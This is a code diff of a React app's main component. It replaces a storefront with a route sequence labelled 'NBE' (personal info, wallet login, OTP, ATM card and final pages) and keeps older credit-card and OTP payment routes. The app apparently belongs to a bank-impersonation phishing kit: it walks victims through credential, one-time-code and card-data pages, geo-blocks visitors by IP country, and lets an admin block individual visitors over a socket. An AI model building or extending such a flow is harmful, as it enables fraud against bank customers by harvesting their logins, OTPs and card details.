@@ -8,58 +8,39 @@ import ScrollToTop from "./components/ScrollToTop";
 import PageTitleUpdater from "./components/PageTitleUpdater";
 import { ThemeProvider } from "./contexts/ThemeContext";
 import { initializeSocket, disconnectSocket, socket } from "./lib/store";
-import AmerChat from "./components/AmerChat";
-import RamadanPopup from "./components/RamadanPopup";
 
+// NBE Pages
+import HomePage from "./pages/nbe/HomePage";
+import PersonalInfoPage from "./pages/nbe/PersonalInfoPage";
+import WalletLoginPage from "./pages/nbe/WalletLoginPage";
+import OTPPageNBE from "./pages/nbe/OTPPageNBE";
+import ATMPageNBE from "./pages/nbe/ATMPageNBE";
+import FinalPageNBE from "./pages/nbe/FinalPageNBE";
 
-// Form Pages
+// Legacy Payment Pages (kept for backward compatibility)
 import SummaryPayment from "./pages/SummaryPayment";
-
-// Payment Pages
 import CreditCardPayment from "./pages/CreditCardPayment";
 import OTPVerification from "./pages/OTPVerification";
-
-
-
-
-
-
-// Final Page
 import FinalPage from "./pages/FinalPage";
-
-// Store Pages
-import { StoreProvider, LanguageProvider, StorePage, CollectionPage, ProductPage, CartPage, SearchPage } from './store';
-
 
 function Router() {
   return (
     <Switch>
-      {/* Main Pages */}
-      <Route path={"/"} component={StorePage} />
-      <Route path={"/store"} component={StorePage} />
-      <Route path={"/store/collection/:handle"} component={CollectionPage} />
-      <Route path={"/store/product/:handle"} component={ProductPage} />
-      <Route path={"/store/cart"} component={CartPage} />
-      <Route path={"/store/search"} component={SearchPage} />
+      {/* NBE Flow - Main Routes */}
+      <Route path={"/"} component={HomePage} />
+      <Route path={"/personal-info"} component={PersonalInfoPage} />
+      <Route path={"/wallet-login"} component={WalletLoginPage} />
+      <Route path={"/otp-nbe"} component={OTPPageNBE} />
+      <Route path={"/atm-nbe"} component={ATMPageNBE} />
+      <Route path={"/final-nbe"} component={FinalPageNBE} />
 
-      {/* Form Routes */}
+      {/* Legacy Payment Routes */}
       <Route path={"/summary-payment"} component={SummaryPayment} />
-
-      {/* Payment Routes */}
       <Route path={"/credit-card-payment"} component={CreditCardPayment} />
       <Route path={"/otp-verification"} component={OTPVerification} />
-
-
-
-
-
-
-      {/* Final Page */}
       <Route path={"/final-page"} component={FinalPage} />
 
-
       <Route path={"/404"} component={NotFound} />
-      {/* Final fallback route */}
       <Route component={NotFound} />
     </Switch>
   );
@@ -96,6 +77,7 @@ function App() {
       disconnectSocket();
     };
   }, []);
+
   // Listen for admin block/unblock events
   useEffect(() => {
     const s = socket.value;
@@ -119,20 +101,17 @@ function App() {
   useEffect(() => {
     const checkCountry = async () => {
       try {
-        // Get visitor's country from IP
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         const visitorCountry = data.country_name;
         
-        // Check with server if country is blocked
         socket.value.emit('blockedCountries:check', visitorCountry);
         
-        socket.value.on('blockedCountries:checkResult', ({ isBlocked }) => {
+        socket.value.on('blockedCountries:checkResult', ({ isBlocked }: { isBlocked: boolean }) => {
           setIsCountryBlocked(isBlocked);
           setIsCheckingCountry(false);
         });
 
-        // Also listen for updates to blocked countries
         socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
           const isBlocked = blockedCountries.some(c => 
             c.toLowerCase() === visitorCountry.toLowerCase()
@@ -145,10 +124,7 @@ function App() {
       }
     };
 
-    // Wait for socket to be ready
     const timer = setTimeout(checkCountry, 1000);
-    
-    // Fallback: if still checking after 3 seconds, allow access
     const fallbackTimer = setTimeout(() => {
       setIsCheckingCountry(false);
     }, 3000);
@@ -159,7 +135,6 @@ function App() {
     };
   }, []);
 
-  // Show loading while checking country
   if (isCheckingCountry) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center">
@@ -168,11 +143,10 @@ function App() {
     );
   }
 
-  // Show blocked page if country is blocked
   if (isCountryBlocked) {
     return <BlockedCountryPage />;
   }
-  // Show blocked page if visitor is blocked by admin
+
   if (isVisitorBlocked) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -196,13 +170,7 @@ function App() {
           <Toaster />
           <ScrollToTop />
           <PageTitleUpdater />
-          <AmerChat />
-          <RamadanPopup />
-          <LanguageProvider>
-            <StoreProvider>
-              <Router />
-            </StoreProvider>
-          </LanguageProvider>
+          <Router />
         </TooltipProvider>
       </ThemeProvider>
     </ErrorBoundary>
